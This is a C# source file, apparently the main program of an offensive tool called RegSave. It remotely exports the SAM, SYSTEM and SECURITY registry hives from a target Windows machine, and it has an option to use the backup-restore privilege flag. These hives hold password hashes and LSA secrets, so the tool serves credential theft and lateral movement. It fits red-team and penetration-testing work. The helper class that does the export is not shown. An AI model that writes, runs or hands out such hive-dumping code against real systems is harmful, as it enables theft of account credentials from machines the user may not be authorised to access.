using System;
using System.Collections.Generic;
using System.IO;

using CommandLine;
using CommandLine.Text;

namespace RegSave
{
    internal class Program
    {
        public class Options
        {
            [Option('t', "Target", Required = true, HelpText = "Remote machine name")]
            public string Target { get; set; }

            [Option('o', "OutputPath", Required = true, HelpText = "Registry hives output directory path")]
            public string OutputPath { get; set; }

            [Option("backup", Default = false, HelpText = "Use REG_OPTION_BACKUP_RESTORE flag for RegOpenKeyEx")]
            public bool BackupOperators { get; set; }

            [Option("acl", Default = false, HelpText = @"Show ACL for registry key SYSTEM\ControlSet001\Control\SecurePipeServers\winreg")]
            public bool ShowAcl { get; set; }
        }

        static void DisplayHelp<T>(ParserResult<T> result, IEnumerable<Error> errors)
        {
            var helpText = HelpText.AutoBuild(
                result,
                h =>
                {
                    h.AdditionalNewLineAfterOption = false;
                    h.Heading = "";
                    h.AutoVersion = false;
                    h.MaximumDisplayWidth = 120;
                    h.Copyright = "";
                    return HelpText.DefaultParsingErrorsHandler(result, h);
                },
                e => e);

            Console.WriteLine(helpText);
        }

        static void DumpReg(string remoteMachine, string registryPath, bool backupOperators, bool showAcl)
        {
            try
            {
                if (showAcl)
                    Reg.GetAcl(remoteMachine, @"SYSTEM\ControlSet001\Control\SecurePipeServers\winreg");
                //Privileges.EnableDisablePrivilege("SeBackupPrivilege", true);
                //Privileges.EnableDisablePrivilege("SeRestorePrivilege", true);
                Reg.ExportRegKey(remoteMachine, "SAM", Path.Combine(registryPath, Guid.NewGuid().ToString().ToUpper()), backupOperators);
                Reg.ExportRegKey(remoteMachine, "SYSTEM", Path.Combine(registryPath, Guid.NewGuid().ToString().ToUpper()), backupOperators);
                Reg.ExportRegKey(remoteMachine, "SECURITY", Path.Combine(registryPath, Guid.NewGuid().ToString().ToUpper()), backupOperators);
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
                Console.WriteLine(e.StackTrace);
            }
        }

        public static void Main(string[] args)
        {
            /* if (!Privileges.IsHighIntegrity())
            {
                Console.WriteLine("\n[!] Not running in high integrity process.\n");
                return;
            }

            if (args.Length != 1)
            {
                Console.WriteLine("\n[!] Invalid number of arguments.\n");
                return;
            } */

            var parser = new Parser(with => with.HelpWriter = null);
            var parserResult = parser.ParseArguments<Options>(args);

            try
            {
                parserResult
                .WithParsed(options =>
                    DumpReg(
                        options.Target,
                        options.OutputPath,
                        options.BackupOperators,
                        options.ShowAcl))
                .WithNotParsed(errs => DisplayHelp(parserResult, errs));
            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] {e.Message}");
            }
        }
    }
}
